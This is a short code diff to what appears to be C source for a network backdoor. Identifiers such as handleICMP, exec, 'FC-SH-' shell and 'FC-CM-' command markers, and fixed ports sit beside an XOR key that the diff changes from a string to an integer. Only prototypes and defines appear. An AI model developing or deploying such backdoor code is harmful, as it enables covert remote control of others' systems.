@@ -56,7 +56,7 @@ void handleICMP(char*, struct ip_hdr_s*);
 void compare(int, char*);
 void rev(char*);
 void exec(char*);
-void XORCipher(char*, char*, int);
+void XORCipher(char*, int, int);
 struct sockaddr_in* GetIP();
 
 #define IP_HEADER_SIZE 20
@@ -78,7 +78,7 @@ struct sockaddr_in* GetIP();
 #define SHELL 	"FC-SH-"
 #define COMMAND "FC-CM-"
 
-#define XOR_KEY "\x10"
+#define XOR_KEY 0x10
 
 #define SRC_PORT 	6006
 #define SRC_PORT_2	2628 
